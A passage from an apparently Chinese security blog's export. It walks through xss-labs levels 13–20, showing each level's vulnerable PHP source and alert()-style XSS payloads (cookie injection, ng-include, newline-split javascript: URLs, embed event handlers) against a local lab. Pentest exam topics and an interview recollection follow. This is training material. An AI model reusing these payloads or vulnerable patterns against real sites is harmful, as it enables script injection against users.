<h1 id="level13"><a href="#level13" class="headerlink" title="level13:"></a>level13:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level14.php&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level13<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level13<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);</span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;keyword&quot;];</span></span><br><span class="line"><span class="meta">$str00 = $_GET[&quot;t_sort&quot;];</span></span><br><span class="line"><span class="meta">$str11=$_COOKIE[&quot;user&quot;];</span></span><br><span class="line"><span class="meta">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span></span><br><span class="line"><span class="meta">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form id=search&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level13.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>bp抓包，cookie后面的内容改为：<code>click here&quot;type=&quot;button&quot;onclick=&quot;javascript:alert(123)</code></li>
</ul>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/52990352b60e409bbb6c1ee2be55e9eb~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2c0549d6216943748f09fed8c362ad82~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<h1 id="level14"><a href="#level14" class="headerlink" title="level14:"></a>level14:</h1><blockquote>
<p>不知道为啥，总是跳到这个地址 </p>
</blockquote>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bfe2177460e940728e6b88068edf8994~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<h1 id="level15"><a href="#level15" class="headerlink" title="level15:"></a>level15:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;angular.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level16.php?keyword=test&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level15<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到第15关，自己想个办法走出去吧！<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level15.png</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;src&quot;];</span></span><br><span class="line"><span class="meta">echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">127.0.0.1/xss-labs-master/level15.php?src=&#x27;http://127.0.0.1/xss-labs-master/level1.php?name=&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;xss&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/41df86ed7da0439196b9191cd30593fc~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<h1 id="level16"><a href="#level16" class="headerlink" title="level16:"></a>level16:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level17.php?arg01=a&amp;arg02=b&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level16<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level16<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = strtolower($_GET[&quot;keyword&quot;]);</span></span><br><span class="line"><span class="meta">$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span></span><br><span class="line"><span class="meta">$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span></span><br><span class="line"><span class="meta">$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</span></span><br><span class="line"><span class="meta">$str5=str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level16.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">127.0.0.1/xss-labs-master/level16.php?keyword=&lt;a%0Ahref=&#x27;javas%0Acript:alert(&quot;xss&quot;)&#x27;&gt;xss</span><br></pre></td></tr></table></figure>

<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2a31397d644b4055af689496170ef927~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<h1 id="level17"><a href="#level17" class="headerlink" title="level17:"></a>level17:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>); </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level17<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level17<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>成功后，<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">level18.php?arg01</span>=<span class="string">a&amp;arg02</span>=<span class="string">b</span>&gt;</span>点我进入下一关<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1bd104f874bd450591961f356d38bd14~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<h1 id="level18"><a href="#level18" class="headerlink" title="level18:"></a>level18:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level19.php?arg01=a&amp;arg02=b&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level18<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level18<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">127.0.0.1/xss-labs-master/level18.php?arg01=       onfoucs&amp;arg02=javascript:alert(123)</span><br></pre></td></tr></table></figure>
<ul>
<li>怎么都弹不了窗，百度后，需要使用IE浏览器，我是火狐，没有IE<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">网上搜的payload:</span><br></pre></td></tr></table></figure>
<code>http://192.168.132.132/xss-labs-master/level18.php?arg01=a&amp;arg02= onmouseover=alert(1)</code></li>
</ul>
<p><code>http://192.168.132.132/xss-labs-master/level18.php?arg01=a&amp;arg02= onmouseout=alert</code>1<code> </code></p>
<p><code>http://127.0.0.1/xss/level18.php?arg01= onfoucs&amp;arg02=javascript:alert(123)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># level19:</span><br><span class="line">```html</span><br><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level20.php?arg01=a&amp;arg02=b&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level19&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level19&lt;/h1&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &#x27;&lt;embed src=&quot;xsf03.swf?&#x27;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#x27;&quot; width=100% heigth=100%&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="level20"><a href="#level20" class="headerlink" title="level20:"></a>level20:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level21.php?arg01=a&amp;arg02=b&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level20<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level20<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">echo &#x27;&lt;embed src=&quot;xsf04.swf?&#x27;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#x27;&quot; width=100% heigth=100%&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>后面的是不是都需要用IE浏览器做哟？怎么就是弹窗不了？</li>
<li>参考链接：</li>
<li><a href="https://www.jianshu.com/p/4e3a517bc4ea">https://www.jianshu.com/p/4e3a517bc4ea</a></li>
<li><a href="https://www.cnblogs.com/wangyuyang1016/p/13532898.html#_caption_7">https://www.cnblogs.com/wangyuyang1016/p/13532898.html#_caption_7</a></li>
</ul>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>奇安信渗透测试2023笔试题</title>
    <url>/2022/10/27/%E5%A5%87%E5%AE%89%E4%BF%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%952023%E7%AC%94%E8%AF%95%E9%A2%98/</url>
    <content><![CDATA[<p>奇安信 笔试 渗透测试2023<br>weblogic jboss iis常见漏洞，<br>序列化，<br>ssrf可以利用哪些协议<br> SQL注入分类<br>csrf危害<br>文件包含有哪些函数<br>文件上传之黑名单<br>xss分类 xxe可以使用哪些协议<br>代码执行有哪些函数<br>mongdb默认端口<br>redis端口<br>Java序列化实现那两个类<br>会话固定攻击有哪些<br>log4j漏洞<br>redis未授权访问有哪些利用方式<br>shiro流量特征<br>哪些语言存在反序列化漏洞<br>nmap怎样获取版本(SV)</p>
]]></content>
      <categories>
        <category>笔试</category>
      </categories>
      <tags>
        <tag>笔试</tag>
      </tags>
  </entry>
  <entry>
    <title>深信服安全运营-校招-2023</title>
    <url>/2022/10/27/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E6%A0%A1%E6%8B%9B-2023/</url>
    <content><![CDATA[<p>全程大概四十分钟左右：<br>SQL注入漏洞如何探测手工、工具<br>网络拓扑图会画嘛？(没听说过)<br>内网简单问了一下<br>TCP协议<br>深信服waf 、防火墙等等的了解<br>Windows电脑中毒如何应急响应<br>写的工具，具体问什么原理<br>前沿漏洞进行过复现与学习嘛<br>CTF参加过嘛，做过哪些题<br>渗透测试信息收集<br>中间件漏洞了解过嘛<br>在浏览器中输入url后回车后会发生哪些操作<br>sqlmap工具的使用<br>日志分析<br>校园经历<br>深信服了解嘛<br>投递过其他公司嘛，你如何选择入职的公司<br>你有其他问题嘛？(反问)<br>其他的忘了</p>
]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>首页</title>
    <url>/2022/10/01/%E9%A6%96%E9%A1%B5/</url>
    <content><![CDATA[<hr>
<p>邮箱：<a href="mailto:&#x72;&#x65;&#112;&#104;&#x30;&#114;&#64;&#102;&#x6f;&#120;&#109;&#97;&#105;&#108;&#46;&#x63;&#x6f;&#109;">&#x72;&#x65;&#112;&#104;&#x30;&#114;&#64;&#102;&#x6f;&#120;&#109;&#97;&#105;&#108;&#46;&#x63;&#x6f;&#109;</a></p>
<p>掘金：<a href="https://juejin.cn/user/3153817156976791">https://juejin.cn/user/3153817156976791</a></p>
<hr>
]]></content>
      <tags>
        <tag>首页</tag>
      </tags>
  </entry>
</search>
